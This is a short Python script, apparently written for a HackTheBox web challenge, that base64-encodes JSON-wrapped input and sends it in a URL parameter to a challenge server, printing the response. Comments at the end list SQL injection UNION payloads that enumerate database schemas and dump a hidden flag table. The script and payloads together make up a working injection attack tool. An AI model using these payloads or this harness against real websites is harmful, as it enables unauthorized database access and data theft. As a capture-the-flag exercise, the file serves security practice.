# TThis script is used for testing sql with HackTheBox.
#  It takes the string and passes it to the object paraater in the URL and gains access to the database

import requests
import base64
import re
from bs4 import BeautifulSoup
import sys

if len(sys.argv)<2:
    print("Syntax:python %s <port>")%(sys.argv[0])
else:
    print('-'*55)
    print("HTB WEB-CHALLENGE coded by ZyperX [Ez-Pz]")
    print('-'*55)
    while True:
        cmd=raw_input("[*]Enter cmd : ")
        payload=('{"ID":\"%s\"}')%(cmd)
        print("[*]Payload : %s")%(payload)
        print("[*]Base64 encoding..")
        payload=base64.b64encode(payload)
        print("[*]Encoded Payload : %s")%(payload)
        r=requests.session()
        port=str(sys.argv[1])
        url="http://docker.hackthebox.eu:"
        port=port+"/?obj="
        url=url+port
        url=url+payload
        print("[*]Sending GET request to : %s")%(url)
        op=r.get(url)
        soup=BeautifulSoup(op.text,'html.parser')
        soup=soup.find('body').text.strip()
        print("[*]Response : %s")%(soup)
        print("-"*80)


#         ' UNION SELECT * from (SELECT 1)a JOIN (SELECT column_name from `information_schema`.`columns`)b#
#         ' UNION SELECT * from (SELECT 1)a JOIN (SELECT column_name from `information_schema`.`columns`)b#
#         ' UNION SELECT * from (SELECT column_name from `information_schema`.`columns`)a#


#         ' UNION SELECT * from (SELECT 1)a JOIN (SELECT table_name from mysql.innodb_table_stats)b#
# DATAFlagTableUnguessableEzPZgtid_slave_pos

# flAgEzPZSQLi' UNION SELECT * from (SELECT 1)a JOIN (SELECT table_name from ezpz.FlagTableUnguessableEzPZ)b#' UNION SELECT * from (SELECT 1)a JOIN (SELECT * from ezpz.FlagTableUnguessableEzPZ)b#